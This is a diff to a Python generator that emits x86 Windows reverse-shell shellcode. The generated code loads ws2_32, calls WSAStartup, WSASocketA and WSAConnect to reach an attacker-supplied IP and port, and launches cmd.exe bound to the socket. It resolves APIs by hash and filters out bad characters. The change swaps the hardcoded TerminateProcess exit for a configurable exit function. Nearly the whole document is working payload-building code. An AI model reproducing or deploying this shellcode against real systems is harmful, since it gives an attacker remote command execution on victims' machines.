@@ -1,20 +1,20 @@
 from coder.util import (
+    call_exit_func,
     convert_ip_addr_hex,
     convert_port_hex,
     find_and_call,
     find_hash_key,
-    find_kernel32,
     push_hash,
     push_string,
 )
 
 
-def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
+def generate(ip_addr, port, bad_chars, exit_func, debug=False):
     ip_addr_hex = convert_ip_addr_hex(ip_addr)
     port_hex = convert_port_hex(port)
     hash_key = find_hash_key(
         ["LoadLibraryA", "WSAStartup", "WSASocketA", "WSAConnect", "CreateProcessA"]
-        + ([] if no_terminate_process else ["TerminateProcess"]),
+        + ([exit_func] if exit_func else []),
         bad_chars,
     )
 
@@ -24,11 +24,6 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         mov   ebp, esp
         add   esp, 0xfffff9f0           // Avoid NULL bytes
 
-    {find_kernel32()}
-
-    save_kernel32:
-        mov   [ebp+0x14], ebx
-
     {find_and_call(hash_key)}
 
     load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
@@ -36,9 +31,6 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         push  esp                       // lpLibFileName = &("ws2_32.dll")
         {push_hash('LoadLibraryA', hash_key)}
         call dword ptr [ebp+0x04]       // Call LoadLibraryA
-
-    save_ws2_32:
-        mov   [ebp+0x18], eax
 
     call_wsastartup:                    // int WSAStartup(WORD wVersionRequired, [out] LPWSADATA lpWSAData);
         mov   eax, esp                  // eax = esp
@@ -50,7 +42,6 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         mov   ax, 0x0202                // eax = 0x202
         push  eax                       // wVersionRequired = 0x202
         {push_hash('WSAStartup', hash_key)}
-        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call WSAStartup
 
     call_wsasocketa:                    // SOCKET WSAAPI WSASocketA([in] int af, [in] int type, [in] int protocol, [in] LPWSAPROTOCOL_INFOA lpProtocolInfo, [in] GROUP g, [in] DWORD dwFlags);
@@ -65,7 +56,6 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         inc   eax                       // eax = 0x2
         push  eax                       // eax = 0x2
         {push_hash('WSASocketA', hash_key)}
-        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call WSASocketA
         mov   esi, eax                  // esi = sock
 
@@ -92,7 +82,6 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         push  edi                       // *name = &(sockaddr_in)
         push  esi                       // s = sock
         {push_hash('WSAConnect', hash_key)}
-        mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call WSAConnect
 
     create_startupinfoa:                // typedef struct _STARTUPINFOA {{DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;}}
@@ -134,18 +123,7 @@ def generate(ip_addr, port, bad_chars, no_terminate_process=False, debug=False):
         push  ebx                       // lpCommandLine = &("cmd.exe")
         push  eax                       // lpApplicationName = NULL
         {push_hash('CreateProcessA', hash_key)}
-        mov   ebx, [ebp+0x14]           // Set Kernel32 Address
         call dword ptr [ebp+0x04]       // Call CreateProcessA
 
-    {
-    f'''
-    call_terminateprocess:              // BOOL TerminateProcess([in] HANDLE hProcess, [in] UINT uExitCode);
-        xor   ecx, ecx                  // ECX = 0
-        push  ecx                       // uExitCode = 0
-        push  0xffffffff                // hProcess = 0xffffffff
-        {push_hash('TerminateProcess', hash_key)}
-        mov   ebx, [ebp+0x14]           // Set Kernel32 Address
-        call dword ptr [ebp+0x04]       // Call TerminateProcess
-    ''' if not no_terminate_process else ''
-    }
+    {call_exit_func(exit_func, hash_key)}
     """
